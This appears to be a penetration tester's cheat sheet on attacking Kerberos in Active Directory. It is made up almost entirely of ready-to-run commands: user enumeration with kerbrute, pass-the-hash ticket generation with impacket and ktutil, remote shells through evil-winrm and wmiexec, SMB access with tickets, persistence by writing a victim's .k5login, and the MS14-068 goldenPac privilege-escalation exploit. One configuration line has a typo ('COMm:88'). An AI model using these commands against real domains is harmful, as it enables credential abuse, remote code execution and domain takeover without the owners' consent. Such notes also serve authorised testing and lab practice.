---
title: "Kerberos"
date: 2024-7-2
tags: ["kerberos", "kerbrute", "active directory", "ad", "domain controller", "Windows", "smb", "MS14-068", "golden ticket", "goldpac"]
---

---
### Kerbrute

[kerbrute](https://github.com/ropnop/kerbrute)

```bash
kerbrute userenum --domain example.com --dc 10.10.11.10 usernames.txt
```

#### Usernames generator

[username-anarchy](https://github.com/urbanadventurer/username-anarchy)

```bash
./username-anarchy -i users.txt | tee usernames.txt
```

<br>

---

### Generate Kerberos Ticket (From Linux)

#### Method #1 : Using impacket

```bash
sudo ntpdate -s 10.10.11.10 && impacket-getTGT -hashes :<HASH> example.com/administrator
```

```bash
export KRB5CCNAME=administrator.ccache
```

```bash
# Check ticket
klist
```

#### Method #2 : Using kinit

```bash
# Step 0: Installation
sudo apt install krb5-user cifs-utils
```

```bash
# Step 1: Add domain controller to '/etc/hosts' (Try different order if not work)
10.10.11.10 dc01.example.com example.com dc01
```

```bash
# Step 2: Add domain controller as a DNS server to '/etc/resolv.conf'
nameserver 10.10.11.10
```

```bash
# Step 3: Edit '/etc/krb5.conf'

[libdefaults]
    default_realm = EXAMPLE.COM

[realms]
    EXAMPLE.COM = {
        kdc = DC01.EXAMPLE.COMm:88
        admin_server = dc01.EXAMPLE.COM
        default_domain = EXAMPLE.COM
    }
    
[domain_realm]
    .domain.internal = EXAMPLE.COM
    domain.internal = EXAMPLE.COM
```

```bash
# Step 4: Sync time to domain controller
sudo ntpdate -s example.com
```

#### 2a. Without Creds

```bash
# Generate kerberos ticket for user: user
kinit user
```

#### 2b. With Hash

```bash
ktutil
```

```bash
add_entry -p administrator@EXAMPLE.COM -k 1 -key -e rc4-hmac
```

```bash
<HASH>
```

```bash
write_kt administrator.keytab
```

```bash
exit
```

```bash
kinit -V -k -t administrator.keytab -f administrator@EXAMPLE.COM
```

#### Check ticket

```bash
klist
```

<br>

---

### Remote to target with kerberos

#### Method #1 : Using evil-winrm 

```bash
sudo ntpdate -s 10.10.11.10 && evil-winrm -i dc.example.com -r EXAMPLE.COM
```

#### Method #2 : Using wmiexec

```bash
sudo ntpdate -s 10.10.11.10 && impacket-wmiexec example.com/administrator@dc.example.com -k -no-pass
```

<br>

---

### Connect to SMB with kerberos

```bash
sudo ntpdate -s 10.10.11.10 && impacket-smbclient example.com/username@dc.example.com -k -no-pass
```

<br>

---

### Add Kerboros Access (Linux)

```bash
echo "user@EXAMPLE.COM" > /home/target_user/.k5login
```

<br>

---

### MS14-068 (Forged Golden Ticket)

```bash
# With creds
impacket-goldenPac 'example.com/user:password@dc01'
```

```bash
# With hash
impacket-goldenPac --hashes :hash 'example.com/user@dc01'
```

<br>